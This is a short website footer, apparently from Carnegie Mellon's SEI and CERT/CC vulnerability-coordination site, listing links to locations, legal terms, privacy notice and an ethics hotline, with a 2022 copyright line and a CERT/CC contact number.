[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800


